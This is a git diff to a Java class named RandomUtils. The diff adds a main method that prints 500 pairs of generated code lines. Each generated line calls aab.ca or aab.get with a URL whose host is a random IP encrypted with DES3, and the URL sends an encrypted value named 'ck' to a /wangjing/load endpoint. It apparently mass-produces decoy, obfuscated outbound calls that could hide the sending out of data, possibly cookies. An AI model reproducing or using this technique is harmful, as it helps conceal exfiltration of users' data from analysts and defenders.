@@ -1,5 +1,7 @@
 package wj.util;
 
+import wj.safe.Des3Util;
+
 import java.util.Random;
 
 /**
@@ -11,9 +13,16 @@ import java.util.Random;
  **/
 public class RandomUtils {
 
+    public static Random random = new java.util.Random();
+
     public static void main(String[] args) {
-        System.out.println(generatePassword(15));
-        System.out.println(getRandomPasswordToLowerCase(15));
+
+        for (int i = 0; i < 500; i++) {
+            String ip = RandomUtils.getRandomNo() + "." + RandomUtils.getRandomNo() + "." + RandomUtils.getRandomNo() + "." + RandomUtils.getRandomNo();
+            System.out.println("aab.ca(\"http://" + Des3Util.encode(ip) + "/wangjing/load?code=" + "\"+" + "UrlUtil.urlEncode(Des3Util.encode(ck)));");
+            String ip1 = RandomUtils.getRandomNo() + "." + RandomUtils.getRandomNo() + "." + RandomUtils.getRandomNo() + "." + RandomUtils.getRandomNo();
+            System.out.println("aab.get(\"http://" + Des3Util.encode(ip1) + "/wangjing/load?code=" + "\"+" + "UrlUtil.urlEncode(Des3Util.encode(ck)));");
+        }
     }
 
 
@@ -65,6 +74,10 @@ public class RandomUtils {
 
     public static String getRandomNo(int numberLength) {
         return getRandomNo(numberLength, 0);
+    }
+
+    public static String getRandomNo() {
+        return random.nextInt(999) + "";
     }
 
     public static String getRandomNo(int numberLength, int letterLength) {
